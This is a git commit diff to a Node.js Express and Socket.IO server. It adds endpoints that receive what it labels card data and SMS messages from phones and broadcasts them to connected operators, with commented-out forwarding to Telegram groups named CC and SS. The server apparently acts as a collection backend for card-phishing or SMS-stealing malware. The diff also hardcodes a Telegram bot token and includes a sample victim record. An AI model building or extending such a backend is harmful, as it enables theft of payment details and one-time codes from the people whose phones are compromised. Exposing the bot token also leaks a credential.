efa1195deddd414d23c5cc0c06e2f80fb4e2ca42
Harsh luthra <harsh.luthra92@gmail.com>
2024-03-22 04:45:32 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,11 @@
+// Importing necessary modules
+const TelegramBot = require('node-telegram-bot-api');
+const token = '6336680132:AAF2OsVc6-wAPG3FRCl5TpFbHHY_avIWedw';
+const bot = new TelegramBot(token, { polling: false });
+const groupIdCC = '-1001962858861';
+const groupIdSS = '-1002030300737';
+
+
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -12,10 +20,34 @@ const server = http.createServer(app);
 // Attach Socket.IO to the HTTP server
 const io = socketIo(server);
 
-app.use(express.json());
+const jsonData = {
+  message: 'Done!',
+};
 
-app.get('/api1', (req, res) => {
-  res.send('This is the response from the first Express server');
+var sample = 'CC: e0245006ee341f59\nNAME: NO CARD\nNum_IN: \nRealme Rmx215\nINS_D: 2024-03-18 07:43:02 PM\n2024-03-19 01:00:43 am\nLMT:';
+
+app.get('/', (req, res) => {
+  io.emit('card_got', sample);
+  res.send(jsonData);
+});
+
+app.post('/dataIO', (req, res) => {
+  console.log('DATA IO',req.body.data);
+  const data_ = req.body.data;
+  io.emit('user_online',data_);
+  res.status(200).send(jsonData);
+});
+
+app.post('/dataC', (req, res) => {
+  console.log('DATA C',req.body.data);
+  const data_ = req.body.data;
+  io.emit('card_got',data_);
+  //bot.sendMessage(groupIdCC, data_).then(() => {})
+  //.catch((error) => {
+  //    console.log("ERROR",error);
+  //});
+  res.status(200).send(jsonData);
+  io.emit('card_got',data_);
 });
 
 app.post('/dataS', (req, res) => {
@@ -26,7 +58,8 @@ app.post('/dataS', (req, res) => {
   //.catch((error) => {
   //    console.log("ERROR",error);
   //});
-	res.status(200).send('Done!');
+	res.status(200).send(jsonData);
+	io.emit('sms_got',data_);
 });
 
 // Socket.IO event handlers
@@ -34,11 +67,24 @@ io.on('connection', (socket) => {
   console.log('WebSocket client connected');
   socket.on('message', (message) => {
     console.log('Received message:', message);
-    socket.emit('message', 'Hello from WebSocket server!');
+    socket.emit('msg', 'Hello from WebSocket server!');
   });
+  	socket.on('card_send' , function(data){
+		io.emit('card_got',data);
+	});
+	socket.on('send_card_copy' , function(data){
+		io.emit('card_copy',data);
+	});
 });
 
 // Start the HTTP server
 server.listen(port, () => {
   console.log(`Server running at http://localhost:${port}`);
 });
+
+
+
+
+
+
+
